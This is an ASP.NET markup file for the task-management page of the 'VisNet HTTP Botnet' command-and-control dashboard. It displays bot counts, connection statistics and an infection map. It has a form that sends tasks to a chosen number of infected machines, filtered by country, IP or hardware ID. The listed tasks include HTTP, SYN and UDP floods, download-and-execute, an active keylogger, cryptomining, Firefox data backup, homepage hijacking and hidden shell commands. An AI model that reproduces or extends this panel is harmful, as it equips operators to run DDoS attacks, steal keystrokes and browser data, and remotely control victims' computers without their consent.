<%@ Page Language="C#" AutoEventWireup="true" CodeFile="Tasks.aspx.cs" Inherits="Tasks" %>

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">

<head runat="server">
    <title>VisNet Dashboard</title>
    <link href="CSS/menu.css" rel="stylesheet" />
    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
    <script src="JS/jquery.easypiechart.min.js"></script>
    <script>
        $(function() {
            var $chart = $('.chart');
            $chart.easyPieChart({
                onStep: function(from, to, percent) {
                $(this.el).find('.percent').text(Math.round(percent));
                }
            });
        });
    </script>
    <link href="CSS/jquery-jvectormap-2.0.3.css" rel="stylesheet" />
    <script src="JS/jquery-1.8.2.js"></script>
    <script src="JS/jquery-jvectormap-2.0.3.min.js"></script>
    <script src="JS/jquery-jvectormap-world-mill-en.js"></script>
    <script>
    jQuery.noConflict();
    jQuery(function(){
        var $ = jQuery;
        var proc = {<%=procentSyntax%>}
        $('#map1').vectorMap({
        backgroundColor: "",
        map: 'world_mill_en',
        series: {           
          regions: [{
            scale: ['#ADC093', '#23312B'],
            normalizeFunction: 'polynomial',
            values: {
                <%=kleurSyntax%>
            }
          }]
        },
            onRegionTipShow: function (e, el, code) {
                if (proc[code] === undefined) {
                    el.html(el.html() + ' ( 0 % )');
                }
                else {
                    el.html(el.html() + ' ( ' + proc[code] + ' % )');
                }
            }
      });
    })
  </script>
    <style type="text/css">
        .auto-style1 {
            width: 100%;
        }
        .auto-style2 {
            width: 163px;
        }
    </style>
</head>

<body class="Dashboard">
    <form id="form2" runat="server">
        <div class="Sidebar">
            <ul>
                <li>
                    <a href="Dashboard.aspx">
                        <img id="House" src="Image/HouseIcon.png" />
                    </a>
                </li>
                <li>
                    <a href="Tasks.aspx">
                        <img id="Logs" src="Image/Tasks.png" />
                    </a>
                </li>
                <li>
                    <a href="Dashboard.aspx">
                        <img id="Calender" src="Image/Calender.png" />
                    </a>
                </li>
                <li>
                    <a href="Dashboard.aspx">
                        <img id="Folder1" src="Image/folder.png" />
                    </a>
                </li>
                <li>
                    <a href="Dashboard.aspx">
                        <img id="Folder2" src="Image/folder.png" />
                    </a>
                </li>
            </ul>
        </div>

        <div class="TotalBotsSidebar">
            <div class="AmountTotal">
                <ul>
                    <li>TOTAL BOTS:
                        <asp:Label ID="lblTotalBots" runat="server" Font-Names="Arial">0</asp:Label>
                    </li>
                </ul>
            </div>

            <div class="AmountGraphs">
                <ul>
                    <li>Online Now</li>
                    <li>
                        <span class="chart" <asp:Literal ID="onlineNowPrec" runat="server"></asp:Literal>>
                         <span class="percent"></span>
	                    </span>
                    </li>

                    <li>Connections Today</li>
                    <li>
                        <span class="chart" <asp:Literal ID="connTodayPrec" runat="server"></asp:Literal>>
		                    <span class="percent"></span>
	                    </span>
                    </li>

                    <li>Connections This Week</li>
                    <li>
                        <span class="chart" <asp:Literal ID="connWeekPrec" runat="server"></asp:Literal>>
		                    <span class="percent"></span>
	                    </span>
                    </li>

                    <li>Connections This Month</li>
                    <li>
                        <span class="chart" <asp:Literal ID="connMonthPrec" runat="server"></asp:Literal>>
		                    <span class="percent"></span>
	                    </span>
                    </li>
                </ul>
            </div>
        </div>

        <div class="TitleBar">
            <div class="Title">
                <h1>VISNET HTTP BOTNET</h1>
            </div>
            <div class="Tabs">
                <ul>
                    <li class="right">
                        <a href="Logout.aspx">Logout</a>
                    </li>
                    <li>/</li>
                    <li>
                        <a href="Tasks.aspx">Tasks Management</a>
                    </li>
                    <li>/</li>
                    <li>
                        <a href="<%//TODO: Add a destenation%>">Connection Logs</a>
                    </li>
                    <li>/</li>
                    <li>
                        <a href="Dashboard.aspx">DashBoard</a>
                    </li>
                </ul>
            </div>
        </div>

        <hr class="FirstLine" />

        <div class="Summary">
            <div class="OnnlineNow">
                <asp:Label CssClass="Number" ID="lblOnnlineNow" runat="server" Text="0" ></asp:Label>
                <br />
                <asp:Label ID="lblOnnlineNowText" runat="server" Text="ONLINE NOW"></asp:Label>
            </div>

            <div class="ConnectionsToday">
                <asp:Label CssClass="Number" ID="lblConnectionsToday" runat="server" Text="0"></asp:Label>
                <br />
                <asp:Label ID="lblConnectionsTodayText" runat="server" Text="CONNECTIONS TODAY"></asp:Label>
            </div>

            <div class="ConnectionsWeek">
                <asp:Label CssClass="Number" ID="lblConnectionsWeek" runat="server" Text="0"></asp:Label>
                <br />
                <asp:Label ID="lblConnectionsWeekText" runat="server" Text="CONNECTIONS THIS WEEK"></asp:Label>
            </div>

            <div class="ConnectionsMonth">
                <asp:Label CssClass="Number" ID="lblConnectionsMonth" runat="server" Text="0"></asp:Label>
                <br />
                <asp:Label ID="lblConnectionsMonthText" runat="server" Text="CONNECTIONS THIS MONTH"></asp:Label>
            </div>

            <div class="ConnectionsTotal">
                <asp:Label CssClass="Number" ID="lblConnectionsTotal" runat="server" Text="0"></asp:Label>
                <br />
                <asp:Label ID="lblConnectionsTotalText" runat="server" Text="TOTAL CONNECTIONS"></asp:Label>
            </div>
        </div>
        <hr class="SecondLine"/>

        <div class="Tasks">
            <div class="TaskName">
                <ul>
                    <li>TASK MANAGEMENT</li>
                </ul>
            </div>
            <div class="TasksGrid">
                <div class="Grid">
                    <br />
                    <table class="auto-style1">
                        <tr>
                            <td class="auto-style2">
                    <asp:Label ID="lblDropdown" runat="server" Text="Task"></asp:Label>
                            </td>
                            <td>
                    <asp:DropDownList ID="DropDownList1" runat="server" AppendDataBoundItems="True" DataTextField="name" DataValueField="divisionid">
                        <asp:ListItem Value="0" disabled selected hidden >Nothing selected</asp:ListItem>
                        <asp:ListItem Value="clipboard">Clipboard Manager</asp:ListItem>
                        <asp:ListItem Value="http">HTTP Flood</asp:ListItem>
                        <asp:ListItem Value="syn">SYN Flood</asp:ListItem>
                        <asp:ListItem Value="udp">UDP Flood</asp:ListItem>
                        <asp:ListItem Value="download">Download and Execute</asp:ListItem>
                        <asp:ListItem Value="firefox">FireFox Backup</asp:ListItem>
                        <asp:ListItem Value="homepage">Change Homepage</asp:ListItem>
                        <asp:ListItem Value="keylogger">Active Keylogger</asp:ListItem>
                        <asp:ListItem Value="mine">Mine</asp:ListItem>
                        <asp:ListItem Value="cleanse">System Cleanse</asp:ListItem>
                        <asp:ListItem Value="update">Update</asp:ListItem>
                        <asp:ListItem Value="uninstall">Uninstall</asp:ListItem>
                        <asp:ListItem Value="viewhidden">View Website (Hidden)</asp:ListItem>
                        <asp:ListItem Value="viewvisable">View Website (Visible)</asp:ListItem>
                        <asp:ListItem Value="shellvisable">Shell Command (Hidden)</asp:ListItem>
                        <asp:ListItem>Shell Command (Visible)</asp:ListItem>
                    </asp:DropDownList>
                            </td>
                        </tr>
                        <tr>
                            <td class="auto-style2">
                    <asp:Label ID="lblFilter" runat="server" Text="Filter"></asp:Label>
                            </td>
                            <td>
                    <asp:TextBox ID="txtFilter" runat="server" placeholder="Example: US, 127.0.0.1, BFEBFBFF000306C3"></asp:TextBox>
                            </td>
                        </tr>
                        <tr>
                            <td class="auto-style2">
                    <asp:Label ID="lblAmount" runat="server" Text="Amount"></asp:Label>
                            </td>
                            <td>
                    <asp:TextBox ID="txtAmount" runat="server" placeholder="Amount of bots to run Task"></asp:TextBox>
                            </td>
                        </tr>
                        <tr>
                            <td class="auto-style2">&nbsp;</td>
                            <td>
                    <asp:Button ID="Button1" runat="server" Text="Button" />
                            </td>
                        </tr>
                    </table>
                    <br />
                    <br />
                    <br />
                   <asp:GridView cssClass="grdTask" ID="grdTask" runat="server">
                   </asp:GridView>
                </div>
            </div>
        </div>
    </form>
</body>
</html>
